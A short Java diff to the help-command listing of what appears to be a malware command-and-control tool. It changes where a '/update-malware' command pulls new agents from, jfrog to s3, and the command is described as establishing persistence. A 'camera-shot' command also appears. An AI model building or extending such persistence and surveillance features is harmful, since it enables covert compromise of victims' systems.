@@ -52,7 +52,7 @@ public class HelpCommand implements Command {
                 .example("camera-shot")
                 .build());
         helpCommandArrayList.add(HelpCommand.builder().commandName("/update-malware")
-                .description("pull the latest released agent from jfrog and attempts to establish persistence with the new agent")
+                .description("pull the latest released agent from s3 and attempts to establish persistence with the new agent")
                 .requiredParams("NA")
                 .example("/update-malware")
                 .build());
